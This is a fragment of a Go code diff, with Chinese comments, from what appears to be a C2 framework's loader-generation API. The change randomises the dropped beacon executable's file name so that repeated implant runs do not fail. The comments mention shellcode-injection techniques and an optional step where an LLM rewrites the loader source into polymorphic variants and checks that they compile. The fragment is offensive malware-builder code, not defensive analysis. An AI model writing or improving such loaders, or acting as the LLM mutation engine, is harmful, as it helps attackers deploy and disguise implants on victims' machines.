@@ -104,9 +104,10 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 500, "模板渲染失败: "+err.Error())
 		return
 	}
-	if b.Technique == "t0_drop" {
-		src = strings.ReplaceAll(src, "beacon.exe", randDropName())
-	}
+	// 落盘名随机化：t0/t3 均落盘执行——固定名 beacon.exe 会被上一次运行
+	// 残留的 beacon 进程锁住（Windows 运行中 exe 不可覆盖）→ 之后每次静默失败。
+	// t1（纯 shellcode 注入）无此字面量，ReplaceAll 空操作无碍。
+	src = strings.ReplaceAll(src, "beacon.exe", randDropName())
 	// ③' AI 源码级多态变形（可选）：LLM 语义保持改写 → 编译验证 → 失败重试一次
 	aiApplied := false
 	if b.AIPoly {
